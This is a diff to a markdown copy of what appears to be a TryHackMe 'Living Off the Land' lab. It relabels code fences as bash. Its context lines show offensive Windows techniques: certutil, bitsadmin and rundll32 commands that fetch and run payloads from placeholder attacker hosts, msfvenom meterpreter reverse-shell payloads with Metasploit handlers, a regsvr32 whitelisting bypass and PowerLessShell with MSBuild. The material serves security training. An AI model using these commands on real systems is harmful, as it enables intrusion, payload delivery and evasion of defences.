@@ -57,7 +57,7 @@ Use the following credentials below.
 Machine IP: MACHINE_IP  Username: thm  Password: TryHackM3
 
    Connect to the VM via RDP client 
-```Connect to the VM via RDP client 
+```bash
 user@machine$ xfreerdp /v:MACHINE_IP /u:thm /p:TryHackM3
 ```
 
@@ -118,7 +118,7 @@ In order to use these tools, you either download them or by entering the Sysinte
 Note that since the attached VM does not have internet access, we pre-downloaded the Sysinternal tools in C:\Tools\.
 
   Command Prompt 
-```Command Prompt 
+```bash
 C:\Users\thm> C:\Tools\SysinternalsSuite\PsExec64.exe
 ```
 
@@ -233,7 +233,7 @@ To illustrate this with an example, we can use certutil.exe to download a file f
  
 
 Command Prompt
-```Command Prompt 
+```bash
 certutil -URLcache -split -f http://Attacker_IP/payload.exe C:\Windows\Temp\payload.exe
 ```
 
@@ -247,7 +247,7 @@ Also, the certutil.exe can be used as an encoding tool where we can encode files
  
 
 Command Prompt
-```Command Prompt 
+```bash
 C:\Users\thm> certutil -encode payload.exe Encoded-payload.txt
 ```
 
@@ -264,7 +264,7 @@ Attackers may abuse the BITS jobs to download and execute a malicious payload in
 Introduce the terminal container content (revisit)
 
 Command Prompt
-```Command Prompt 
+```bash
 C:\Users\thm>bitsadmin.exe /transfer /Download /priority Foreground http://Attacker_IP/payload.exe c:\Users\thm\Desktop\payload.exe
 ```
 
@@ -285,7 +285,7 @@ However, an unintended way was found by using findstr.exe to download remote fil
  
 
 Command Prompt
-```Command Prompt 
+```bash
 C:\Users\thm>findstr /V dummystring \\MachineName\ShareFolder\test.exe > c:\Windows\Temp\test.exe
 ```
 
@@ -345,7 +345,7 @@ In order to create a child process of explorer.exe parent, we can execute the fo
  
 
 Command Prompt
-```Command Prompt 
+```bash
 C:\Users\thm> explorer.exe /root,"C:\Windows\System32\calc.exe"
 ```
 
@@ -360,7 +360,7 @@ Windows Management Instrumentation (WMIC) is a Windows command-line utility that
  
 
 Command Prompt
-```Command Prompt 
+```bash
 C:\Users\thm>wmic.exe process call create calc
 Executing (Win32_Process)->Create()
 Method execution successful.
@@ -396,7 +396,7 @@ Now let's try to execute a calc.exe binary as proof of concept using the rundll3
  
 
 Command Prompt
-```Command Prompt 
+```bash
 C:\Users\thm> rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");
 ```
 
@@ -409,7 +409,7 @@ As we mentioned previously, we can also execute PowerShell scripts using the run
  
 
 Command Prompt
-```Command Prompt 
+```bash
 C:\Users\thm> rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://AttackBox_IP/script.ps1');");
 ```
 
@@ -445,7 +445,7 @@ Besides its intended use, regsvr32.exe binary can also be used to execute arbitr
 Let's try to apply this technique in real life. First, we need to create a malicious DLL file using msvenom and set up our Metasploit listener to receive a reverse shell. Note that we will be creating a malicious file that works for 32bit operating systems. We will be using the regsvr32.exe Application Whitelisting Bypass technique to run a command on a target system.
 
 Terminal
-```Terminal 
+```bash
 user@machine$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f dll -a x86 > live0fftheland.dll 
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload 
 No encoder specified, outputting raw payload 
@@ -469,7 +469,7 @@ msf6 exploit(multi/handler) > exploit
 Note that we specified the output type as DLL using the-f argument. Once the malicious DLL file is generated, we need to deliver the payload to the victim machine. We will do this by using a webserver to serve the DLL file on our attacking machine as follows,
 
 Terminal
-```Terminal 
+```bash
 user@machine$ python3 -m http.server 1337
 ```
 
@@ -478,7 +478,7 @@ From the victim machine, visit the webserver of the attacking machine on port 13
 On the victim machine, once the file DLL file is downloaded, we execute it using regsvr32.exe  as follows,
 
 Command Prompt
-```Command Prompt 
+```bash
 C:\Users\thm> c:\Windows\System32\regsvr32.exe c:\Users\thm\Downloads\live0fftheland.dll
 or
 C:\Users\thm> c:\Windows\System32\regsvr32.exe /s /n /u /i:http://example.com/file.sct Downloads\live0fftheland.dll
@@ -494,7 +494,7 @@ With the second option, which is a more advanced command, we instruct the regsvr
 On the attacking machine, we should receive a reverse shell.
 
 Terminal
-```Terminal 
+```bash
 msf6 > exploit(multi/handler) > exploit 
 
 [*] Started reverse TCP handler on ATTACKBOX_IP:443 
@@ -560,7 +560,7 @@ PowerLessShell is a Python-based tool that generates malicious code to run on a 
 First, let's download a copy of the project from the GitHub repo onto the AttackBox:
 
 Terminal
-```Terminal 
+```bash
 user@machine$ git clone https://github.com/Mr-Un1k0d3r/PowerLessShell.git
 ```
 
@@ -571,7 +571,7 @@ One of the project requirements is to get a PowerShell payload to make it suitab
  
 
 Terminal
-```Terminal 
+```bash
 user@machine$ msfvenom -p windows/meterpreter/reverse_winhttps LHOST=AttackBox_IP LPORT=4443 -f psh-reflection > liv0ff.ps1
 ```
 
@@ -582,7 +582,7 @@ user@machine$ msfvenom -p windows/meterpreter/reverse_winhttps LHOST=AttackBox_I
  
 
 Terminal
-```Terminal 
+```bash
 user@machine$ msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_winhttps; set lhost AttackBox_IP;set lport 4443;exploit"
 [*] Using configured payload generic/shell_reverse_tcp
 payload => windows/meterpreter/reverse_winhttps
@@ -597,7 +597,7 @@ lhost => AttackBox_IP lport => 4443
  
 
 Terminal
-```Terminal 
+```bash
 user@machine$ python2 PowerLessShell.py -type powershell -source /tmp/liv0ff.ps1 -output liv0ff.csproj
 ```
 
@@ -610,7 +610,7 @@ Finally, on the target Windows machine, build the .csproj file and wait for the 
  
 
 Command Prompt!
-```Command Prompt! 
+```bash
 C:\Users\thm> c:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe c:\Users\thm\Desktop\liv0ff.csproj
 ```
 
